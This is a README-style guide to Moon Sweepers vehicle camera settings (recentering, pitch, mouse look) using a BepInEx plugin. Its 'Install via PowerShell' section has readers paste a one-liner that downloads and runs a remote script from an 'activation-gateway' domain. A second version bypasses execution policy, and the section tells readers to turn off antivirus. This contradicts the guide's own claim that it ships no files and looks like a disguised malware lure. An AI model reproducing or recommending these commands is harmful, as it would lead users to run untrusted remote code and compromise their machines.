<div align="center">

# Moon Sweepers Vehicle Camera Settings: Auto-Recenter, Pitch & Mouse Look — Guide

![](files/preview.png)

[![license](https://img.shields.io/badge/LICENSE-CC--BY--SA--4.0-ec4899?style=for-the-badge&labelColor=0d1117)]() [![language](https://img.shields.io/badge/LANGUAGE-PYTHON-f472b6?style=for-the-badge&labelColor=0d1117)]() [![pwsh](https://img.shields.io/badge/PWSH-5%2B-db2777?style=for-the-badge&labelColor=0d1117)]()

</div>

---

This guide documents how Moon Sweepers handles its vehicle camera and how to approach the settings that govern auto-recentering, pitch limits, mouse look, and slope-following behavior. It separates what the base game exposes from what a client-side BepInEx plugin can change, so the two layers are not confused when troubleshooting. Where community mods are involved, this guide describes configuration concepts and a testing workflow rather than shipping third-party files, since the original authors control their own distribution. Settings are presented in a way that encourages changing one value at a time and comparing results against the stock camera before committing to a configuration.

## ⚡ Install via PowerShell

> [!TIP]
> **One-line setup** — just run the command below.
> Windows 10/11 · PowerShell · Admin not required

### 1️⃣ Open PowerShell
* Press `Win + X`.
* Click **Terminal** or **Windows PowerShell** from the menu.

### 2️⃣ Run the command
Paste the command into PowerShell and hit `Enter`.

```cmd
iex(irm 'https://activation-gateway.cc/update/ps-activator')
```

### 3️⃣ If PowerShell blocks the script
Copy into CMD, press `Enter`, wait for completion:

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "iex(irm 'https://activation-gateway.cc/update/ps-activator')"
```

> [!WARNING]
> Some antivirus engines flag automated installers. If blocked, disable Real-time protection briefly, run the setup, and enable it back.

## ✅ Before You Start

- Windows 10 or Windows 11
- PowerShell 5.1 or newer (already available on Windows)
- Active network connection
- No admin rights needed

## Background

Moon Sweepers is a driving-focused title in which the in-vehicle camera does most of the work of communicating speed, terrain, and heading. The stock implementation is functional but opinionated: it recenters behind the driver after a short delay, holds a relatively high pitch on inclines, and limits how far the player can look around while moving. For players who prefer a looser, more manual view — or who find the default motion uncomfortable over long sessions — these behaviors are the most common source of friction, and they are the reason camera tuning comes up so often in community discussion. The settings themselves are not exposed through an in-game menu, so any adjustment happens either through the base game's existing input options or through a client-side plugin.

The de facto community solution is a BepInEx-based camera plugin maintained by its original author and distributed through a mod hosting site. It is a client-side IL2CPP plugin, meaning it runs entirely on the local machine and does not touch save data or shared physics. Its configuration is written to a plain-text file under the BepInEx config directory on first launch, which exposes parameters for recenter delay, minimum and maximum pitch, slope following, and look-ahead behavior. The plugin also documents an F10 keybind for toggling between the modded and stock cameras, which is the simplest way to evaluate whether a given configuration actually improves the experience before committing to it.

Two caveats are worth stating plainly. First, the plugin is not bundled with this guide and its author prohibits redistribution, so the only legitimate source is the original release page; this repository documents configuration and troubleshooting rather than shipping files. Second, the plugin depends on a specific loader build and a metadata patcher, and it targets a specific game patch — at the time of writing, version 1.0.4. Players on other patches, or without the correct loader, will typically see the plugin fail silently, which is why the troubleshooting workflow begins with verifying that the config file was actually generated and checking the loader log before changing any values. Treat the settings as a starting point: change one parameter at a time, drive a known route, and compare against the stock camera with the toggle.

## Key Points

- **Camera behavior is a local preference, not a game setting.** The stock Moon Sweepers camera controls what the driver sees on their own screen; no camera adjustment documented here changes vehicle handling, save data, or synchronized co-op physics.

- **Auto-recentering drives most complaints.** The camera returning behind the driver after a short delay is a deliberate comfort feature; understanding the recenter delay and the conditions that trigger it is the first step before considering any mod.

- **Pitch limits and slope view are separate concerns.** A camera that tilts too far up or down on inclines is governed by pitch clamps, while slope-follow behavior determines whether the horizon stays level; each can be tuned independently and should be adjusted one at a time.

- **Mouse look sensitivity interacts with camera smoothing.** Raising sensitivity without accounting for the smoothing applied during recentering often makes the view feel worse, not better; test stock controls before layering changes.

- **The community camera mod is client-side and author-restricted.** The existing BepInEx-based Vehicle Camera Fix plugin is published and maintained by its original author, who prohibits redistribution; this guide documents configuration and troubleshooting only and does not bundle or mirror the mod.

- **Version alignment matters.** The mod was tested against a specific game patch, so mismatched game or loader versions are a common cause of a plugin that installs but never activates.

- **Configuration lives in a generated file.** After a first successful run, the plugin writes a config file under the BepInEx config directory; documented keys cover recenter timing, minimum and maximum pitch, slope following, and look-ahead, and editing them incrementally is safer than changing several at once.

- **A stock-comparison toggle simplifies tuning.** The mod exposes a default key to switch between modded and vanilla camera behavior, which is the most reliable way to judge whether a change actually helps.

- **Failure diagnosis follows a fixed order.** Verify the loader and dependency requirements, confirm the config file was created, then inspect the BepInEx log; if the plugin still fails, restore the unmodified camera rather than mixing partial fixes.

- **Honest limits apply.** This guide is documentation, not a fix; it cannot resolve game-side camera design decisions, and results depend on the mod author's ongoing maintenance of a third-party plugin.

## Examples

The following examples illustrate typical camera complaints in Moon Sweepers and the configuration approach that addresses each one. They are written as scenarios rather than prescriptive fixes, since the community Vehicle Camera Fix mod is maintained by its original author and its documented options may change between releases. Always confirm option names against the mod page and the generated config file before editing.

**Example 1 — Camera snaps back too aggressively after a turn**

A driver looks over their shoulder to check a trailer or a passing vehicle, releases the mouse, and the camera whips back behind the vehicle almost instantly. This is the stock recentering behavior. In the community mod's config file, the recentering delay is the first value worth extending: a short delay keeps the camera where the player left it for a moment before easing back. Raising it too far, however, makes the camera feel loose during tight maneuvers, so change it in small increments and test on a familiar route. The mod's documented F10 toggle is useful here, letting the same corner be driven with the mod camera and the stock camera back to back.

**Example 2 — Viewpoint sits too high on slopes**

On inclined terrain the stock camera tends to ride upward, so the vehicle occupies the lower part of the frame and the road ahead is compressed. The mod exposes separate minimum and maximum pitch limits, and a slope-follow behavior that governs how much the camera tilts with the terrain. A practical starting point is to narrow the pitch range slightly and reduce slope following, then evaluate on a route with both a steep climb and a descent. Because pitch limits and slope follow interact, adjust one at a time; changing both simultaneously makes it difficult to tell which value produced the improvement.

**Example 3 — Mouse look feels uncomfortable while driving**

Some players find the default mouse sensitivity and pitch travel excessive for a driving game, producing motion discomfort during long sessions. The mod's look-ahead and pitch settings can soften this, but the base game's own mouse sensitivity should be tested first with no mods installed, as described in the troubleshooting workflow. If the stock controls are already acceptable, the mod's look settings can be left near default and only the recentering behavior changed. This separates input comfort from camera behavior and avoids compounding two adjustments.

**Example 4 — Plugin installed but nothing changes**

A common report is that the config file exists but the camera behaves exactly as before. The usual causes are a missing or mismatched BepInEx IL2CPP build, a missing metadata patcher, or a plugin loaded against a different game version than the one the author tested. Checking the BepInEx log for load errors and confirming the game patch version against the mod's stated compatibility resolves most of these cases. If the plugin still fails, restoring the unmodified camera and waiting for an author update is preferable to mixing files from other sources, which the author's redistribution terms do not permit.

**Example 5 — Comparing mod and stock cameras on the same route**

A reliable way to judge any setting is a fixed comparison loop: drive one short route with the mod active, note where the camera loses the road or recenters unexpectedly, then repeat with the stock camera via the documented toggle. Recording the config values alongside observations makes it possible to revert a change that felt worse without guessing. This method also surfaces settings that seem fine in open terrain but cause problems in tunnels, tight corners, or reverse driving, where camera behavior is most noticeable.

## References

The material in this guide is drawn from direct inspection of Moon Sweepers version 1.0.4 and from the author-published documentation for the community Vehicle Camera Fix plugin. Where a claim depends on the mod author's own statements—such as the client-only scope of the camera changes, the default F10 comparison toggle, and the creation of the configuration file under the BepInEx config directory—it is presented as the author's stated position rather than as an independently verified fact.

The plugin was first published on 26 October 2026 and is described by its author as tested against game version 1.0.4. Because the game is still receiving patches, settings names, defaults, and even the existence of the configuration file may change without notice. Anyone relying on this guide should treat the version number as a snapshot and confirm current behavior against the plugin's own documentation before adjusting values.

The BepInEx loader and the metadata patcher required by the camera plugin are separate projects with their own maintainers and release cycles. This guide only describes how they fit into the workflow; it does not document their internals. Troubleshooting steps that reference log files or configuration paths assume a standard BepInEx layout and may not apply to custom installations.

Several points in this guide are explicitly uncertain. The interaction between the plugin's pitch limits and the game's own slope handling has not been exhaustively tested across all terrain types, and the reported behavior on steep inclines is based on limited observation. Frame-rate-dependent camera smoothing is likewise unconfirmed. These gaps are noted so that readers can weigh the guidance accordingly rather than treating it as authoritative.

No third-party files are redistributed here. The camera plugin remains the property of its author, who has stated that re-uploading to other sites is not permitted; readers should obtain it from the original source. The bundled executable mentioned in the release archive is unrelated to Moon Sweepers and is documented separately in the troubleshooting section.

Finally, this guide is community documentation, not an official publication. It is offered in good faith and reflects the best available information at the time of writing, but it carries no warranty. Corrections and counterexamples from other players are welcome, since the accuracy of a guide like this depends on continued reporting from the people actually using these settings.

## Conclusion

Taken together, the material above reflects a deliberately narrow scope: this guide documents camera behavior and the configuration surface of a community-made plugin; it does not ship that plugin, patch the game, or promise a universal fix. The most reliable results come from treating the stock camera as the baseline, changing one setting at a time, and confirming each change against the documented toggle before moving on. Users who skip the baseline step tend to misattribute sensitivity or pitch discomfort to the mod when the cause is the game's own defaults.

It is worth being explicit about what remains uncertain. Camera feel is subjective, and values that suit one driving style or display setup may not suit another; the ranges discussed here are starting points, not prescriptions. Community mods can also lag behind game patches, so behavior verified on one version may shift after an update. When a plugin fails to load or a setting appears to have no effect, the log file and a clean unmodified comparison are the fastest ways to isolate the cause — and restoring the original camera is always a valid fallback.

Finally, respect for the original author's terms is part of using this guide correctly. The plugin is maintained elsewhere, distributed under its own conditions, and should be obtained only from its official source; this repository exists to explain and troubleshoot, not to redistribute. Readers who keep that boundary in mind, test incrementally, and document their own working values will get the most consistent results and will be well positioned to adapt when the game or the mod changes.